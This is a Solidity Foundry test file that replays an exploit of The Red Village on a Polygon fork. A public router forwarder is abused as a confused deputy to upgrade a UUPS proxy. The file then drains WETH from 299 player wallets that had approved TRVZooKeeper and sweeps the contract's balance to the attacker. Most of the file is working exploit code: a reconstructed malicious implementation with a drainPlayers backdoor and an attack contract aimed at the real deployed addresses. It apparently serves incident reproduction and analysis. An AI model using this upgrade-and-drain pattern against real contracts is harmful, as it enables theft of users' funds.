// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./VictimsData.sol";

// The Red Village - confused-deputy UUPS upgrade via a public request forwarder - Polygon, 2026-09-21.
//
// Run: forge test --evm-version cancun -vvv
//
// Profit: 31.426018474517367982 WETH net to the attacker EOA (exact on-chain figure).
//         = 31.350379502001367982 WETH pulled from 299 player wallets that had approved TRVZooKeeper
//         + 0.075638972516 WETH that TRVZooKeeper already held. The whole ZooKeeper WETH balance was swept.
//
// On-chain references (Polygon, chainId 137):
//   setup/upgrade tx : 0xac0666c534dcad575cdb1fbcbe5b74e8bba418e35f4273933f62167d5143d55d  (block 94200341)
//   drain tx         : 0x3730141adea0cd5a64824c0a541c4405256b4054ac54d8c1de65fe6ba210dd35  (block 94200868)
//   fork block       : 94200340 (parent of the setup tx - both phases replayed in one test)
//   attacker EOA     : 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F
//   alert            : https://x.com/DefimonAlerts/status/2107824971867119886
//
// Actors / contracts (all REAL deployed bytecode on the fork):
//   PolygonTRVRouter (proxy)        : 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C
//   SeasonService (UUPS proxy)      : 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77
//     original impl                 : 0x23f1dcB561A0D17E9A48fD379400759777B8fCAa
//     real malicious impl (UNVERIF) : 0xA3822CdF2Bb59CeFC7E70Fa5d693B7E9fBc50aFa  (reconstructed below)
//   TRVZooKeeper                    : 0x426d27190a2ddb87f1c6235f710e159a0a3774d4
//   AccessControl provider          : 0x3f0B50B7A270de536D5De35C11C2613284C4304e
//   WETH (Polygon)                  : 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619
//
// ROOT CAUSE (confirmed from the full on-chain trace):
//   PolygonTRVRouter.forwardRequest(string zone, string service, bytes data) is PUBLIC and forwards arbitrary
//   calldata to the resolved service address, with the ROUTER as msg.sender. The router holds the
//   "_authorizeUpgrade" role on SeasonService. SeasonService is a UUPS proxy whose _authorizeUpgrade only
//   checks AccessControl.hasRole(msg.sender, seasonService, "_authorizeUpgrade"). An attacker therefore calls
//   forwardRequest("Season", "SeasonService", upgradeTo(maliciousImpl)); the router (a trusted role holder)
//   performs the upgrade on the attacker's behalf - a classic confused deputy. The malicious implementation,
//   running in the SeasonService proxy's context, inherits the proxy's "transferERC20In" / "transferERC20Out"
//   roles on TRVZooKeeper and uses them to pull WETH from every player wallet that had approved ZooKeeper, then
//   sweep ZooKeeper's entire WETH balance to the attacker.
//
// THE ATTACK (replayed verbatim below):
//   Phase 1 (setup tx): forwardRequest("Season","SeasonService", upgradeTo(maliciousImpl))
//                       -> router calls SeasonService.upgradeTo -> _authorizeUpgrade passes (caller is router)
//                       -> SeasonService impl slot now points at the attacker's contract.
//   Phase 2 (drain tx): the malicious SeasonService, via its ZooKeeper roles, loops
//                       transferERC20In(WETH, victim_i, amount_i) over 299 wallets, then
//                       transferERC20Out(WETH, attacker, zooKeeper.balanceOf(WETH)).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ITRVRouter {
    // PUBLIC entry point - forwards arbitrary calldata to the resolved service with the router as msg.sender.
    function forwardRequest(string calldata zone, string calldata service, bytes calldata data) external;
}

interface ITRVZooKeeper {
    function transferERC20In(address currency, address from, uint256 amount) external;
    function transferERC20Out(address currency, address to, uint256 amount) external;
}

// Entry point used to drive the malicious implementation once it sits behind the SeasonService proxy.
interface IMaliciousSeason {
    function drainPlayers(
        address zooKeeper,
        address weth,
        address[] calldata victims,
        uint256[] calldata amounts,
        address to
    ) external;
}

// ============================================================================================================
// RECONSTRUCTED CONTRACT.
// The real malicious implementation 0xA3822CdF2Bb59CeFC7E70Fa5d693B7E9fBc50aFa is UNVERIFIED on Polygonscan.
// This is a minimal, faithful equivalent of what it must do to reproduce the observed on-chain drain:
//   * expose a UUPS-compatible proxiableUUID() so the original SeasonService.upgradeTo() accepts it, and
//   * expose a backdoor that, running in the proxy's context (and therefore holding the proxy's ZooKeeper
//     roles), pulls WETH from each approving player wallet and then sweeps ZooKeeper's whole WETH balance.
// The attacker-gating (tx.origin check) mirrors the real impl's observed restriction to the attacker EOA.
// ============================================================================================================
contract MaliciousSeasonService {
    // ERC-1967 implementation slot = keccak256("eip1967.proxy.implementation") - 1.
    bytes32 private constant _IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address private immutable attackerEOA;

    constructor(address _attacker) {
        attackerEOA = _attacker;
    }

    // Satisfies the UUPS rollback/compatibility check performed by the original impl's upgradeTo().
    function proxiableUUID() external pure returns (bytes32) {
        return _IMPL_SLOT;
    }

    // Runs via delegatecall inside the SeasonService proxy, so msg.sender toward ZooKeeper is the proxy,
    // which holds the transferERC20In / transferERC20Out roles.
    function drainPlayers(
        address zooKeeper,
        address weth,
        address[] calldata victims,
        uint256[] calldata amounts,
        address to
    ) external {
        require(tx.origin == attackerEOA, "not attacker"); // mirrors the real impl's observed gating
        for (uint256 i = 0; i < victims.length; i++) {
            // Pull from wallets that approved ZooKeeper; skip ones whose allowance/balance no longer covers it.
            address v = victims[i];
            uint256 amt = amounts[i];
            if (IERC20(weth).allowance(v, zooKeeper) < amt) continue;
            if (IERC20(weth).balanceOf(v) < amt) continue;
            ITRVZooKeeper(zooKeeper).transferERC20In(weth, v, amt);
        }
        ITRVZooKeeper(zooKeeper).transferERC20Out(weth, to, IERC20(weth).balanceOf(zooKeeper));
    }
}

// ============================================================================================================
// SINGLE-ENTRYPOINT EXPLOIT CONTRACT (drives the whole recorded attack in ONE call).
// The in-browser Playground recorder deploys this contract (CREATE depth 1) and then calls exactly one
// attack function, recording only that call and its subcalls. So the complete two-phase attack
// (confused-deputy upgrade + drain loop) lives in attack(); the constructor only deploys the malicious impl.
// attack() must be invoked by the real attacker EOA (tx.origin gate on drainPlayers), which the Playground
// guarantees by setting `attacker` to 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F.
// ============================================================================================================
contract TRVExploit {
    address constant ROUTER = 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C;
    address constant SEASON_SERVICE = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
    address constant ZOOKEEPER = 0x426d27190A2DdB87f1C6235F710e159a0A3774D4;
    address constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address constant ATTACKER = 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F;

    // Victims + amounts are passed as calldata (NOT embedded) so the deployed contract stays well under
    // the EIP-170 24KB code-size limit the in-browser EVM enforces.
    function attack(address[] calldata victims, uint256[] calldata amounts) external {
        // Deploy the reconstructed malicious implementation.
        MaliciousSeasonService evilImpl = new MaliciousSeasonService(ATTACKER);

        // --- Phase 1: confused-deputy upgrade (the real setup tx 0xac06...d55d) ---
        // Public forwardRequest makes the ROUTER (a privileged role holder) call SeasonService.upgradeTo().
        ITRVRouter(ROUTER).forwardRequest(
            "Season",
            "SeasonService",
            abi.encodeWithSignature("upgradeTo(address)", address(evilImpl))
        );

        // --- Phase 2: drain (the real drain tx 0x3730...dd35) ---
        // SeasonService (now malicious) uses its ZooKeeper roles to pull every player's WETH and sweep it
        // straight to the attacker EOA.
        IMaliciousSeason(SEASON_SERVICE).drainPlayers(ZOOKEEPER, WETH, victims, amounts, ATTACKER);
    }
}

contract TheRedVillageExploit is BaseTestWithBalanceLog {
    address constant ROUTER = 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C;
    address constant SEASON_SERVICE = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
    address constant ZOOKEEPER = 0x426d27190A2DdB87f1C6235F710e159a0A3774D4;
    address constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address constant ATTACKER = 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F;

    function setUp() public {
        vm.createSelectFork("https://polygon.drpc.org", 94_200_340);
        // Log profit in WETH, measured on the attacker EOA.
        fundingToken = WETH;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        uint256 zkBefore = IERC20(WETH).balanceOf(ZOOKEEPER);
        uint256 atkBefore = IERC20(WETH).balanceOf(ATTACKER);
        emit log_named_decimal_uint("ZooKeeper WETH before", zkBefore, 18);
        emit log_named_decimal_uint("Attacker WETH before", atkBefore, 18);

        // Deploy and drive the single-entrypoint exploit AS the attacker EOA so that:
        //   (a) the deploy happens from ATTACKER, and
        //   (b) tx.origin == ATTACKER throughout, satisfying drainPlayers' gate.
        (address[] memory victims, uint256[] memory amounts) = VictimsData.load();
        vm.startPrank(ATTACKER, ATTACKER);
        TRVExploit e = new TRVExploit();
        e.attack(victims, amounts);
        vm.stopPrank();

        // Confirm the implementation slot now points at the malicious impl deployed inside attack().
        bytes32 implSlot = vm.load(SEASON_SERVICE, _IMPL_SLOT());
        assertTrue(address(uint160(uint256(implSlot))) != address(0), "upgrade did not take effect");

        uint256 atkAfter = IERC20(WETH).balanceOf(ATTACKER);
        uint256 profit = atkAfter - atkBefore;
        emit log_named_decimal_uint("Attacker WETH after", atkAfter, 18);
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);

        // Exact on-chain figure observed at block 94200868.
        assertApproxEqRel(
            profit,
            31_426_018_474_517_367_982,
            0.01e18,
            "attacker profit must match the on-chain WETH sweep (~31.426 WETH)"
        );
    }

    function _IMPL_SLOT() private pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}
